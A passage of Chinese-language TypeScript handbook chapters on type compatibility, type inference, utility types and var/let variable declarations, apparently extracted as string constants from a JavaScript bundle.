结构类型是一种只使用其成员来描述类型的方式。 它正好与名义（nominal）类型形成对比。（译者注：在基于名义类型的类型系统中，数据类型的兼容性或等价性是通过明确的声明和/或类型的名称来决定的。这与结构性类型系统不同，它是基于类型的组成结构，且不要求明确地声明。） 看下面的例子：\n\n```typescript\ninterface Named {\n    name: string;\n}\n\nclass Person {\n    name: string;\n}\n\nlet p: Named;\n// OK, because of structural typing\np = new Person();\n```\n\n在使用基于名义类型的语言，比如C\\#或Java中，这段代码会报错，因为Person类没有明确说明其实现了Named接口。\n\nTypeScript的结构性子类型是根据JavaScript代码的典型写法来设计的。 因为JavaScript里广泛地使用匿名对象，例如函数表达式和对象字面量，所以使用结构类型系统来描述这些类型比使用名义类型系统更好。\n\n### 关于可靠性的注意事项\n\nTypeScript的类型系统允许某些在编译阶段无法确认其安全性的操作。当一个类型系统具此属性时，被当做是“不可靠”的。TypeScript允许这种不可靠行为的发生是经过仔细考虑的。通过这篇文章，我们会解释什么时候会发生这种情况和其有利的一面。\n\n## 开始\n\nTypeScript结构化类型系统的基本规则是，如果`x`要兼容`y`，那么`y`至少具有与`x`相同的属性。比如：\n\n```typescript\ninterface Named {\n    name: string;\n}\n\nlet x: Named;\n// y's inferred type is { name: string; location: string; }\nlet y = { name: 'Alice', location: 'Seattle' };\nx = y;\n```\n\n这里要检查`y`是否能赋值给`x`，编译器检查`x`中的每个属性，看是否能在`y`中也找到对应属性。 在这个例子中，`y`必须包含名字是`name`的`string`类型成员。`y`满足条件，因此赋值正确。\n\n检查函数参数时使用相同的规则：\n\n```typescript\nfunction greet(n: Named) {\n    console.log('Hello, ' + n.name);\n}\ngreet(y); // OK\n```\n\n注意，`y`有个额外的`location`属性，但这不会引发错误。 只有目标类型（这里是`Named`）的成员会被一一检查是否兼容。\n\n这个比较过程是递归进行的，检查每个成员及子成员。\n\n## 比较两个函数\n\n相对来讲，在比较原始类型和对象类型的时候是比较容易理解的，问题是如何判断两个函数是兼容的。 下面我们从两个简单的函数入手，它们仅是参数列表略有不同：\n\n```typescript\nlet x = (a: number) => 0;\nlet y = (b: number, s: string) => 0;\n\ny = x; // OK\nx = y; // Error\n```\n\n要查看`x`是否能赋值给`y`，首先看它们的参数列表。 `x`的每个参数必须能在`y`里找到对应类型的参数。 注意的是参数的名字相同与否无所谓，只看它们的类型。 这里，`x`的每个参数在`y`中都能找到对应的参数，所以允许赋值。\n\n第二个赋值错误，因为`y`有个必需的第二个参数，但是`x`并没有，所以不允许赋值。\n\n你可能会疑惑为什么允许`忽略`参数，像例子`y = x`中那样。 原因是忽略额外的参数在JavaScript里是很常见的。 例如，`Array#forEach`给回调函数传3个参数：数组元素，索引和整个数组。 尽管如此，传入一个只使用第一个参数的回调函数也是很有用的：\n\n```typescript\nlet items = [1, 2, 3];\n\n// Don't force these extra arguments\nitems.forEach((item, index, array) => console.log(item));\n\n// Should be OK!\nitems.forEach((item) => console.log(item));\n```\n\n下面来看看如何处理返回值类型，创建两个仅是返回值类型不同的函数：\n\n```typescript\nlet x = () => ({name: 'Alice'});\nlet y = () => ({name: 'Alice', location: 'Seattle'});\n\nx = y; // OK\ny = x; // Error, because x() lacks a location property\n```\n\n类型系统强制源函数的返回值类型必须是目标函数返回值类型的子类型。\n\n### 函数参数双向协变\n\n当比较函数参数类型时，只有当源函数参数能够赋值给目标函数或者反过来时才能赋值成功。 这是不稳定的，因为调用者可能传入了一个具有更精确类型信息的函数，但是调用这个传入的函数的时候却使用了不是那么精确的类型信息。 实际上，这极少会发生错误，并且能够实现很多JavaScript里的常见模式。例如：\n\n```typescript\nenum EventType { Mouse, Keyboard }\n\ninterface Event { timestamp: number; }\ninterface MouseEvent extends Event { x: number; y: number }\ninterface KeyEvent extends Event { keyCode: number }\n\nfunction listenEvent(eventType: EventType, handler: (n: Event) => void) {\n    /* ... */\n}\n\n// Unsound, but useful and common\nlistenEvent(EventType.Mouse, (e: MouseEvent) => console.log(e.x + ',' + e.y));\n\n// Undesirable alternatives in presence of soundness\nlistenEvent(EventType.Mouse, (e: Event) => console.log((e as MouseEvent).x + \",\" + (e as MouseEvent).y));\nlistenEvent(EventType.Mouse, ((e: MouseEvent) => console.log(e.x + \",\" + e.y)) as (e: Event) => void);\n\n// Still disallowed (clear error). Type safety enforced for wholly incompatible types\nlistenEvent(EventType.Mouse, (e: number) => console.log(e));\n```\n\n你可以使用`strictFunctionTypes`编译选项，使TypeScript在这种情况下报错。\n\n### 可选参数及剩余参数\n\n比较函数兼容性的时候，可选参数与必须参数是可互换的。 源类型上有额外的可选参数不是错误，目标类型的可选参数在源类型里没有对应的参数也不是错误。\n\n当一个函数有剩余参数时，它被当做无限个可选参数。\n\n这对于类型系统来说是不稳定的，但从运行时的角度来看，可选参数一般来说是不强制的，因为对于大多数函数来说相当于传递了一些`undefinded`。\n\n有一个好的例子，常见的函数接收一个回调函数并用对于程序员来说是可预知的参数但对类型系统来说是不确定的参数来调用：\n\n```typescript\nfunction invokeLater(args: any[], callback: (...args: any[]) => void) {\n    /* ... Invoke callback with 'args' ... */\n}\n\n// Unsound - invokeLater \"might\" provide any number of arguments\ninvokeLater([1, 2], (x, y) => console.log(x + ', ' + y));\n\n// Confusing (x and y are actually required) and undiscoverable\ninvokeLater([1, 2], (x?, y?) => console.log(x + ', ' + y));\n```\n\n### 函数重载\n\n对于有重载的函数，源函数的每个重载都要在目标函数上找到对应的函数签名。 这确保了目标函数可以在所有源函数可调用的地方调用。\n\n## 枚举\n\n枚举类型与数字类型兼容，并且数字类型与枚举类型兼容。不同枚举类型之间是不兼容的。比如，\n\n```typescript\nenum Status { Ready, Waiting };\nenum Color { Red, Blue, Green };\n\nlet status = Status.Ready;\nstatus = Color.Green;  // Error\n```\n\n## 类\n\n类与对象字面量和接口差不多，但有一点不同：类有静态部分和实例部分的类型。 比较两个类类型的对象时，只有实例的成员会被比较。 静态成员和构造函数不在比较的范围内。\n\n```typescript\nclass Animal {\n    feet: number;\n    constructor(name: string, numFeet: number) { }\n}\n\nclass Size {\n    feet: number;\n    constructor(numFeet: number) { }\n}\n\nlet a: Animal;\nlet s: Size;\n\na = s;  // OK\ns = a;  // OK\n```\n\n### 类的私有成员和受保护成员\n\n类的私有成员和受保护成员会影响兼容性。 当检查类实例的兼容时，如果目标类型包含一个私有成员，那么源类型必须包含来自同一个类的这个私有成员。 同样地，这条规则也适用于包含受保护成员实例的类型检查。 这允许子类赋值给父类，但是不能赋值给其它有同样类型的类。\n\n## 泛型\n\n因为TypeScript是结构性的类型系统，类型参数只影响使用其做为类型一部分的结果类型。比如，\n\n```typescript\ninterface Empty<T> {\n}\nlet x: Empty<number>;\nlet y: Empty<string>;\n\nx = y;  // OK, because y matches structure of x\n```\n\n上面代码里，`x`和`y`是兼容的，因为它们的结构使用类型参数时并没有什么不同。 把这个例子改变一下，增加一个成员，就能看出是如何工作的了：\n\n```typescript\ninterface NotEmpty<T> {\n    data: T;\n}\nlet x: NotEmpty<number>;\nlet y: NotEmpty<string>;\n\nx = y;  // Error, because x and y are not compatible\n```\n\n在这里，泛型类型在使用时就好比不是一个泛型类型。\n\n对于没指定泛型类型的泛型参数时，会把所有泛型参数当成`any`比较。 然后用结果类型进行比较，就像上面第一个例子。\n\n比如，\n\n```typescript\nlet identity = function<T>(x: T): T {\n    // ...\n}\n\nlet reverse = function<U>(y: U): U {\n    // ...\n}\n\nidentity = reverse;  // OK, because (x: any) => any matches (y: any) => any\n```\n\n## 高级主题\n\n### 子类型与赋值\n\n目前为止，我们使用了“兼容性”，它在语言规范里没有定义。 在TypeScript里，有两种兼容性：子类型和赋值。 它们的不同点在于，赋值扩展了子类型兼容性，增加了一些规则，允许和`any`来回赋值，以及`enum`和对应数字值之间的来回赋值。\n\n语言里的不同地方分别使用了它们之中的机制。 实际上，类型兼容性是由赋值兼容性来控制的，即使在`implements`和`extends`语句也不例外。\n\n更多信息，请参阅[TypeScript语言规范](https://github.com/Microsoft/TypeScript/blob/master/doc/spec.md).\n\n",Ll="# 类型推论\n\n## 介绍\n\n这节介绍TypeScript里的类型推论。即，类型是在哪里如何被推断的。\n\n## 基础\n\nTypeScript里，在有些没有明确指出类型的地方，类型推论会帮助提供类型。如下面的例子\n\n```typescript\nlet x = 3;\n```\n\n变量`x`的类型被推断为数字。 这种推断发生在初始化变量和成员，设置默认参数值和决定函数返回值时。\n\n大多数情况下，类型推论是直截了当地。 后面的小节，我们会浏览类型推论时的细微差别。\n\n## 最佳通用类型\n\n当需要从几个表达式中推断类型时候，会使用这些表达式的类型来推断出一个最合适的通用类型。例如，\n\n```typescript\nlet x = [0, 1, null];\n```\n\n为了推断`x`的类型，我们必须考虑所有元素的类型。 这里有两种选择：`number`和`null`。 计算通用类型算法会考虑所有的候选类型，并给出一个兼容所有候选类型的类型。\n\n由于最终的通用类型取自候选类型，有些时候候选类型共享相同的通用类型，但是却没有一个类型能做为所有候选类型的类型。例如：\n\n```typescript\nlet zoo = [new Rhino(), new Elephant(), new Snake()];\n```\n\n这里，我们想让zoo被推断为`Animal[]`类型，但是这个数组里没有对象是`Animal`类型的，因此不能推断出这个结果。 为了更正，当候选类型不能使用的时候我们需要明确的指出类型：\n\n```typescript\nlet zoo: Animal[] = [new Rhino(), new Elephant(), new Snake()];\n```\n\n如果没有找到最佳通用类型的话，类型推断的结果为联合数组类型，`(Rhino | Elephant | Snake)[]`。\n\n## 上下文归类\n\nTypeScript类型推论也可能按照相反的方向进行。 这被叫做“上下文归类”。按上下文归类会发生在表达式的类型与所处的位置相关时。比如：\n\n```typescript\nwindow.onmousedown = function(mouseEvent) {\n    console.log(mouseEvent.button);   //<- OK\n    console.log(mouseEvent.kangaroo); //<- Error!\n};\n```\n\n在这个例子里，TypeScript类型检查器会使用`Window.onmousedown`函数的类型来推断右边函数表达式的类型。 所以它能够推断出`mouseEvent`参数的[类型](https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent)中包含了`button`属性而不包含`kangaroo`属性。\n\nTypeScript还能够很好地推断出其它上下文中的类型。\n\n```typescript\nwindow.onscroll = function(uiEvent) {\n    console.log(uiEvent.button); //<- Error!\n}\n```\n\n上面的函数被赋值给`window.onscroll`，`TypeScript`能够知道`uiEvent`是[UIEvent](https://developer.mozilla.org/en-US/docs/Web/API/UIEvent)，而不是[MouseEvent](https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent)。`UIEvent`对象不包含`button`属性，因此TypeScript会报错。\n\n如果这个函数不是在上下文归类的位置上，那么这个函数的参数类型将隐式的成为`any`类型，而且也不会报错（除非你开启了`--noImplicitAny`选项）：\n\n```typescript\nconst handler = function(uiEvent) {\n    console.log(uiEvent.button); //<- OK\n}\n```\n\n我们也可以明确地为函数参数类型赋值来覆写上下文类型：\n\n```typescript\nwindow.onscroll = function(uiEvent: any) {\n    console.log(uiEvent.button);  //<- Now, no error is given\n};\n```\n\n但这段代码会打印`undefined`，因为`uiEvent`并不包含`button`属性。\n\n上下文归类会在很多情况下使用到。 通常包含函数的参数，赋值表达式的右边，类型断言，对象成员和数组字面量和返回值语句。 上下文类型也会做为最佳通用类型的候选类型。比如：\n\n```typescript\nfunction createZoo(): Animal[] {\n    return [new Rhino(), new Elephant(), new Snake()];\n}\n```\n\n这个例子里，最佳通用类型有4个候选者：`Animal`，`Rhino`，`Elephant`和`Snake`。 当然，`Animal`会被做为最佳通用类型。\n\n",Ol="# 实用工具类型\n\nTypeScript 提供一些工具类型来帮助常见的类型转换。这些类型是全局可见的。\n\n## 目录\n\n-   [`Partial<T>`，TypeScript 2.1](#partialtype)\n-   [`Readonly<Type>`，TypeScript 2.1](#readonlytype)\n-   [`Record<Keys, Type>`，TypeScript 2.1](#recordkeys-type)\n-   [`Pick<Type, Keys>`，TypeScript 2.1](#picktype-keys)\n-   [`Omit<Type, Keys>`，TypeScript 3.5](#omittype-keys)\n-   [`Exclude<Type, ExcludedUnion>`，TypeScript 2.8](#excludetype-excludedunion)\n-   [`Extract<Type, Union>`，TypeScript 2.8](#extracttype-union)\n-   [`NonNullable<Type>`，TypeScript 2.8](#nonnullabletype)\n-   [`Parameters<Type>`](#parameterstype)\n-   [`ConstructorParameters<Type>`](#constructorparameterstype)\n-   [`ReturnType<Type>`，TypeScript 2.8](#returntypetype)\n-   [`InstanceType<Type>`，TypeScript 2.8](#instancetypetype)\n-   [`Required<Type>`，TypeScript 2.8](#requiredtype)\n-   [`ThisParameterType<Type>`](#thisparametertypetype)\n-   [`OmitThisParameter<Type>`](#omitthisparametertype)\n-   [`ThisType<Type>`，TypeScript 2.8](#thistypetype)\n-   [操作字符串的类型](#操作字符串的类型)\n\n## `Partial<Type>`\n\n构造类型`Type`，并将它所有的属性设置为可选的。它的返回类型表示输入类型的所有子类型。\n\n### 例子\n\n```typescript\ninterface Todo {\n    title: string;\n    description: string;\n}\n\nfunction updateTodo(todo: Todo, fieldsToUpdate: Partial<Todo>) {\n    return { ...todo, ...fieldsToUpdate };\n}\n\nconst todo1 = {\n    title: 'organize desk',\n    description: 'clear clutter',\n};\n\nconst todo2 = updateTodo(todo1, {\n    description: 'throw out trash',\n});\n```\n\n## `Readonly<Type>`\n\n构造类型`Type`，并将它所有的属性设置为`readonly`，也就是说构造出的类型的属性不能被再次赋值。\n\n### 例子\n\n```typescript\ninterface Todo {\n    title: string;\n}\n\nconst todo: Readonly<Todo> = {\n    title: 'Delete inactive users',\n};\n\ntodo.title = 'Hello'; // Error: cannot reassign a readonly property\n```\n\n这个工具可用来表示在运行时会失败的赋值表达式（比如，当尝试给[冻结对象](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze)的属性再次赋值时）。\n\n### `Object.freeze`\n\n```typescript\nfunction freeze<T>(obj: T): Readonly<T>;\n```\n\n## `Record<Keys, Type>`\n\n构造一个类型，其属性名的类型为`K`，属性值的类型为`T`。这个工具可用来将某个类型的属性映射到另一个类型上。\n\n### 例子\n\n```typescript\ninterface PageInfo {\n    title: string;\n}\n\ntype Page = 'home' | 'about' | 'contact';\n\nconst x: Record<Page, PageInfo> = {\n    about: { title: 'about' },\n    contact: { title: 'contact' },\n    home: { title: 'home' },\n};\n```\n\n## `Pick<Type, Keys>`\n\n从类型`Type`中挑选部分属性`Keys`来构造类型。\n\n### 例子\n\n```typescript\ninterface Todo {\n    title: string;\n    description: string;\n    completed: boolean;\n}\n\ntype TodoPreview = Pick<Todo, 'title' | 'completed'>;\n\nconst todo: TodoPreview = {\n    title: 'Clean room',\n    completed: false,\n};\n```\n\n## `Omit<Type, Keys>`\n\n从类型`Type`中获取所有属性，然后从中剔除`Keys`属性后构造一个类型。\n\n### 例子\n\n```typescript\ninterface Todo {\n    title: string;\n    description: string;\n    completed: boolean;\n}\n\ntype TodoPreview = Omit<Todo, 'description'>;\n\nconst todo: TodoPreview = {\n    title: 'Clean room',\n    completed: false,\n};\n```\n\n## `Exclude<Type, ExcludedUnion>`\n\n从类型`Type`中剔除所有可以赋值给`ExcludedUnion`的属性，然后构造一个类型。\n\n### 例子\n\n```typescript\ntype T0 = Exclude<'a' | 'b' | 'c', 'a'>; // \"b\" | \"c\"\ntype T1 = Exclude<'a' | 'b' | 'c', 'a' | 'b'>; // \"c\"\ntype T2 = Exclude<string | number | (() => void), Function>; // string | number\n```\n\n## `Extract<Type, Union>`\n\n从类型`Type`中提取所有可以赋值给`Union`的类型，然后构造一个类型。\n\n### 例子\n\n```typescript\ntype T0 = Extract<'a' | 'b' | 'c', 'a' | 'f'>; // \"a\"\ntype T1 = Extract<string | number | (() => void), Function>; // () => void\n```\n\n## `NonNullable<Type>`\n\n从类型`Type`中剔除`null`和`undefined`，然后构造一个类型。\n\n### 例子\n\n```typescript\ntype T0 = NonNullable<string | number | undefined>; // string | number\ntype T1 = NonNullable<string[] | null | undefined>; // string[]\n```\n\n## `Parameters<Type>`\n\n由函数类型`Type`的参数类型来构建出一个元组类型。\n\n### 例子\n\n```ts\ndeclare function f1(arg: { a: number; b: string }): void;\n\ntype T0 = Parameters<() => string>;\n//    []\ntype T1 = Parameters<(s: string) => void>;\n//    [s: string]\ntype T2 = Parameters<<T>(arg: T) => T>;\n//    [arg: unknown]\ntype T3 = Parameters<typeof f1>;\n//    [arg: { a: number; b: string; }]\ntype T4 = Parameters<any>;\n//    unknown[]\ntype T5 = Parameters<never>;\n//    never\ntype T6 = Parameters<string>;\n//   never\n//   Type 'string' does not satisfy the constraint '(...args: any) => any'.\ntype T7 = Parameters<Function>;\n//   never\n//   Type 'Function' does not satisfy the constraint '(...args: any) => any'.\n```\n\n## `ConstructorParameters<Type>`\n\n由构造函数类型来构建出一个元组类型或数组类型。\n由构造函数类型`Type`的参数类型来构建出一个元组类型。（若`Type`不是构造函数类型，则返回`never`）。\n\n### 例子\n\n```ts\ntype T0 = ConstructorParameters<ErrorConstructor>;\n//    [message?: string | undefined]\ntype T1 = ConstructorParameters<FunctionConstructor>;\n//    string[]\ntype T2 = ConstructorParameters<RegExpConstructor>;\n//    [pattern: string | RegExp, flags?: string | undefined]\ntype T3 = ConstructorParameters<any>;\n//   unknown[]\n\ntype T4 = ConstructorParameters<Function>;\n//    never\n// Type 'Function' does not satisfy the constraint 'new (...args: any) => any'.\n```\n\n## `ReturnType<Type>`\n\n由函数类型`Type`的返回值类型构建一个新类型。\n\n### 例子\n\n```\ntype T0 = ReturnType<() => string>;  // string\ntype T1 = ReturnType<(s: string) => void>;  // void\ntype T2 = ReturnType<(<T>() => T)>;  // {}\ntype T3 = ReturnType<(<T extends U, U extends number[]>() => T)>;  // number[]\ntype T4 = ReturnType<typeof f1>;  // { a: number, b: string }\ntype T5 = ReturnType<any>;  // any\ntype T6 = ReturnType<never>;  // any\ntype T7 = ReturnType<string>;  // Error\ntype T8 = ReturnType<Function>;  // Error\n```\n\n## `InstanceType<Type>`\n\n由构造函数类型`Type`的实例类型来构建一个新类型。\n\n### 例子\n\n```typescript\nclass C {\n    x = 0;\n    y = 0;\n}\n\ntype T0 = InstanceType<typeof C>; // C\ntype T1 = InstanceType<any>; // any\ntype T2 = InstanceType<never>; // any\ntype T3 = InstanceType<string>; // Error\ntype T4 = InstanceType<Function>; // Error\n```\n\n## `Required<Type>`\n\n构建一个类型，使类型`Type`的所有属性为`required`。\n与此相反的是[`Partial`](#partialtype)。\n\n### 例子\n\n```typescript\ninterface Props {\n    a?: number;\n    b?: string;\n}\n\nconst obj: Props = { a: 5 }; // OK\n\nconst obj2: Required<Props> = { a: 5 }; // Error: property 'b' missing\n```\n\n## `ThisParameterType<Type>`\n\n从函数类型中提取 [this](../handbook/functions.md#this参数) 参数的类型。\n若函数类型不包含 `this` 参数，则返回 [unknown](../handbook/basic-types.md#unknown) 类型。\n\n### 例子\n\n```ts\nfunction toHex(this: Number) {\n    return this.toString(16);\n}\n\nfunction numberToString(n: ThisParameterType<typeof toHex>) {\n    return toHex.apply(n);\n}\n```\n\n## `OmitThisParameter<Type>`\n\n从`Type`类型中剔除 [`this`](../handbook/functions.md#this参数) 参数。\n若未声明 `this` 参数，则结果类型为 `Type` 。\n否则，由`Type`类型来构建一个不带`this`参数的类型。\n泛型会被忽略，并且只有最后的重载签名会被采用。\n\n### 例子\n\n```ts\nfunction toHex(this: Number) {\n    return this.toString(16);\n}\n\nconst fiveToHex: OmitThisParameter<typeof toHex> = toHex.bind(5);\n\nconsole.log(fiveToHex());\n```\n\n## `ThisType<Type>`\n\n这个工具不会返回一个转换后的类型。\n它做为上下文的[`this`](../handbook/functions.md#this)类型的一个标记。\n注意，若想使用此类型，必须启用`--noImplicitThis`。\n\n### 例子\n\n```typescript\n// Compile with --noImplicitThis\n\ntype ObjectDescriptor<D, M> = {\n    data?: D;\n    methods?: M & ThisType<D & M>; // Type of 'this' in methods is D & M\n};\n\nfunction makeObject<D, M>(desc: ObjectDescriptor<D, M>): D & M {\n    let data: object = desc.data || {};\n    let methods: object = desc.methods || {};\n    return { ...data, ...methods } as D & M;\n}\n\nlet obj = makeObject({\n    data: { x: 0, y: 0 },\n    methods: {\n        moveBy(dx: number, dy: number) {\n            this.x += dx; // Strongly typed this\n            this.y += dy; // Strongly typed this\n        },\n    },\n});\n\nobj.x = 10;\nobj.y = 20;\nobj.moveBy(5, 5);\n```\n\n上面例子中，`makeObject`参数里的`methods`对象具有一个上下文类型`ThisType<D & M>`，因此`methods`对象的方法里`this`的类型为`{ x: number, y: number } & { moveBy(dx: number, dy: number): number }`。\n\n在`lib.d.ts`里，`ThisType<T>`标识接口是个简单的空接口声明。除了在被识别为对象字面量的上下文类型之外，这个接口与一般的空接口没有什么不同。\n\n## 操作字符串的类型\n\n为了便于操作模版字符串字面量，TypeScript 引入了一些能够操作字符串的类型。\n更多详情，请阅读[模版字面量类型](../handbook-v2/type-manipulation/template-literal-types.md#固有字符串操作类型)。\n",Al='# 变量声明\n\n## 变量声明\n\n`let`和`const`是JavaScript里相对较新的变量声明方式。 [像我们之前提到过的](basic-types.md#a-note-about-let)，`let`在很多方面与`var`是相似的，但是可以帮助大家避免在JavaScript里常见一些问题。 `const`是对`let`的一个增强，它能阻止对一个变量再次赋值。\n\n因为TypeScript是JavaScript的超集，所以它本身就支持`let`和`const`。 下面我们会详细说明这些新的声明方式以及为什么推荐使用它们来代替`var`。\n\n如果你之前使用JavaScript时没有特别在意，那么这节内容会唤起你的回忆。 如果你已经对`var`声明的怪异之处了如指掌，那么你可以轻松地略过这节。\n\n## `var` 声明\n\n一直以来我们都是通过`var`关键字定义JavaScript变量。\n\n```typescript\nvar a = 10;\n```\n\n大家都能理解，这里定义了一个名为`a`值为`10`的变量。\n\n我们也可以在函数内部定义变量：\n\n```typescript\nfunction f() {\n    var message = "Hello, world!";\n\n    return message;\n}\n```\n\n并且我们也可以在其它函数内部访问相同的变量。\n\n```typescript\nfunction f() {\n    var a = 10;\n    return function g() {\n        var b = a + 1;\n        return b;\n    }\n}\n\nvar g = f();\ng(); // returns 11;\n```\n\n上面的例子里，`g`可以获取到`f`函数里定义的`a`变量。 每当`g`被调用时，它都可以访问到`f`里的`a`变量。 即使当`g`在`f`已经执行完后才被调用，它仍然可以访问及修改`a`。\n\n```typescript\nfunction f() {\n    var a = 1;\n\n    a = 2;\n    var b = g();\n    a = 3;\n\n    return b;\n\n    function g() {\n        return a;\n    }\n}\n\nf(); // returns 2\n```\n\n### 作用域规则\n\n对于熟悉其它语言的人来说，`var`声明有些奇怪的作用域规则。 看下面的例子：\n\n```typescript\nfunction f(shouldInitialize: boolean) {\n    if (shouldInitialize) {\n        var x = 10;\n    }\n\n    return x;\n}\n\nf(true);  // returns \'10\'\nf(false); // returns \'undefined\'\n```\n\n有些读者可能要多看几遍这个例子。 变量`x`是定义在_`if`语句里面_，但是我们却可以在语句的外面访问它。 这是因为`var`声明可以在包含它的函数，模块，命名空间或全局作用域内部任何位置被访问（我们后面会详细介绍），包含它的代码块对此没有什么影响。 有些人称此为_`var`作用域_或_函数作用域_。 函数参数也使用函数作用域。\n\n这些作用域规则可能会引发一些错误。 其中之一就是，多次声明同一个变量并不会报错：\n\n```typescript\nfunction sumMatrix(matrix: number[][]) {\n    var sum = 0;\n    for (var i = 0; i < matrix.length; i++) {\n        var currentRow = matrix[i];\n        for (var i = 0; i < currentRow.length; i++) {\n            sum += currentRow[i];\n        }\n    }\n\n    return sum;\n}\n```\n\n这里很容易看出一些问题，里层的`for`循环会覆盖变量`i`，因为所有`i`都引用相同的函数作用域内的变量。 有经验的开发者们很清楚，这些问题可能在代码审查时漏掉，引发无穷的麻烦。\n\n### 捕获变量怪异之处\n\n快速的猜一下下面的代码会返回什么：\n\n```typescript\nfor (var i = 0; i < 10; i++) {\n    setTimeout(function() { console.log(i); }, 100 * i);\n}\n```\n\n介绍一下，`setTimeout`会在若干毫秒的延时后执行一个函数（等待其它代码执行完毕）。\n\n好吧，看一下结果：\n\n```text\n10\n10\n10\n10\n10\n10\n10\n10\n10\n10\n```\n\n很多JavaScript程序员对这种行为已经很熟悉了，但如果你很不解，你并不是一个人。 大多数人期望输出结果是这样：\n\n```text\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n```\n\n还记得我们上面提到的捕获变量吗？ 我们传给`setTimeout`的每一个函数表达式实际上都引用了相同作用域里的同一个`i`。\n\n让我们花点时间思考一下这是为什么。 `setTimeout`在若干毫秒后执行一个函数，并且是在`for`循环结束后。 `for`循环结束后，`i`的值为`10`。 所以当函数被调用的时候，它会打印出`10`！\n\n一个通常的解决方法是使用立即执行的函数表达式（IIFE）来捕获每次迭代时`i`的值：\n\n```typescript\nfor (var i = 0; i < 10; i++) {\n    // capture the current state of \'i\'\n    // by invoking a function with its current value\n    (function(i) {\n        setTimeout(function() { console.log(i); }, 100 * i);\n    })(i);\n}\n```\n\n这种奇怪的形式我们已经司空见惯了。 参数`i`会覆盖`for`循环里的`i`，但是因为我们起了同样的名字，所以我们不用怎么改`for`循环体里的代码。\n\n## `let` 声明\n\n现在你已经知道了`var`存在一些问题，这恰好说明了为什么用`let`语句来声明变量。 除了名字不同外，`let`与`var`的写法一致。\n\n```typescript\nlet hello = "Hello!";\n```\n\n主要的区别不在语法上，而是语义，我们接下来会深入研究。\n\n### 块作用域\n\n当用`let`声明一个变量，它使用的是_词法作用域_或_块作用域_。 不同于使用`var`声明的变量那样可以在包含它们的函数外访问，块作用域变量在包含它们的块或`for`循环之外是不能访问的。\n\n```typescript\nfunction f(input: boolean) {\n    let a = 100;\n\n    if (input) {\n        // Still okay to reference \'a\'\n        let b = a + 1;\n        return b;\n    }\n\n    // Error: \'b\' doesn\'t exist here\n    return b;\n}\n```\n\n这里我们定义了2个变量`a`和`b`。 `a`的作用域是`f`函数体内，而`b`的作用域是`if`语句块里。\n\n在`catch`语句里声明的变量也具有同样的作用域规则。\n\n```typescript\ntry {\n    throw "oh no!";\n}\ncatch (e) {\n    console.log("Oh well.");\n}\n\n// Error: \'e\' doesn\'t exist here\nconsole.log(e);\n```\n\n拥有块级作用域的变量的另一个特点是，它们不能在被声明之前读或写。 虽然这些变量始终“存在”于它们的作用域里，但在直到声明它的代码之前的区域都属于_暂时性死区_。 它只是用来说明我们不能在`let`语句之前访问它们，幸运的是TypeScript可以告诉我们这些信息。\n\n```typescript\na++; // illegal to use \'a\' before it\'s declared;\nlet a;\n```\n\n注意一点，我们仍然可以在一个拥有块作用域变量被声明前_获取_它。 只是我们不能在变量声明前去调用那个函数。 如果生成代码目标为ES2015，现代的运行时会抛出一个错误；然而，现今TypeScript是不会报错的。\n\n```typescript\nfunction foo() {\n    // okay to capture \'a\'\n    return a;\n}\n\n// 不能在\'a\'被声明前调用\'foo\'\n// 运行时应该抛出错误\nfoo();\n\nlet a;\n```\n\n关于_暂时性死区_的更多信息，查看这里[Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let#Temporal_dead_zone_and_errors_with_let).\n\n### 重声明及屏蔽\n\n我们提过使用`var`声明时，它不在乎你声明多少次；你只会得到1个。\n\n```typescript\nfunction f(x) {\n    var x;\n    var x;\n\n    if (true) {\n        var x;\n    }\n}\n```\n\n在上面的例子里，所有`x`的声明实际上都引用一个_相同_的`x`，并且这是完全有效的代码。 这经常会成为bug的来源。 好的是，`let`声明就不会这么宽松了。\n\n```typescript\nlet x = 10;\nlet x = 20; // 错误，不能在1个作用域里多次声明`x`\n```\n\n并不是要求两个均是块级作用域的声明TypeScript才会给出一个错误的警告。\n\n```typescript\nfunction f(x) {\n    let x = 100; // error: interferes with parameter declaration\n}\n\nfunction g() {\n    let x = 100;\n    var x = 100; // error: can\'t have both declarations of \'x\'\n}\n```\n\n并不是说块级作用域变量不能用函数作用域变量来声明。 而是块级作用域变量需要在明显不同的块里声明。\n\n```typescript\nfunction f(condition, x) {\n    if (condition) {\n        let x = 100;\n        return x;\n    }\n\n    return x;\n}\n\nf(false, 0); // returns 0\nf(true, 0);  // returns 100\n```\n\n在一个嵌套作用域里引入一个新名字的行为称做_屏蔽_。 它是一把双刃剑，它可能会不小心地引入新问题，同时也可能会解决一些错误。 例如，假设我们现在用`let`重写之前的`sumMatrix`函数。\n\n```typescript\nfunction sumMatrix(matrix: number[][]) {\n    let sum = 0;\n    for (let i = 0; i < matrix.length; i++) {\n        var currentRow = matrix[i];\n        for (let i = 0; i < currentRow.length; i++) {\n            sum += currentRow[i];\n        }\n    }\n\n    return sum;\n}\n```\n\n这个版本的循环能得到正确的结果，因为内层循环的`i`可以屏蔽掉外层循环的`i`。\n\n_通常_来讲应该避免使用屏蔽，因为我们需要写出清晰的代码。 同时也有些场景适合利用它，你需要好好打算一下。\n\n### 块级作用域变量的获取\n\n在我们最初谈及获取用`var`声明的变量时，我们简略地探究了一下在获取到了变量之后它的行为是怎样的。 直观地讲，每次进入一个作用域时，它创建了一个变量的_环境_。 就算作用域内代码已经执行完毕，这个环境与其捕获的变量依然存在。\n\n```typescript\nfunction theCityThatAlwaysSleeps() {\n    let getCity;\n\n    if (true) {\n        let city = "Seattle";\n        getCity = function() {\n            return city;\n        }\n    }\n\n    return getCity();\n}\n```\n\n因为我们已经在`city`的环境里获取到了`city`，所以就算`if`语句执行结束后我们仍然可以访问它。\n\n回想一下前面`setTimeout`的例子，我们最后需要使用立即执行的函数表达式来获取每次`for`循环迭代里的状态。 实际上，我们做的是为获取到的变量创建了一个新的变量环境。 这样做挺痛苦的，但是幸运的是，你不必在TypeScript里这样做了。\n\n当`let`声明出现在循环体里时拥有完全不同的行为。 不仅是在循环里引入了一个新的变量环境，而是针对_每次迭代_都会创建这样一个新作用域。 这就是我们在使用立即执行的函数表达式时做的事，所以在`setTimeout`例子里我们仅使用`let`声明就可以了。\n\n```typescript\nfor (let i = 0; i < 10 ; i++) {\n    setTimeout(function() 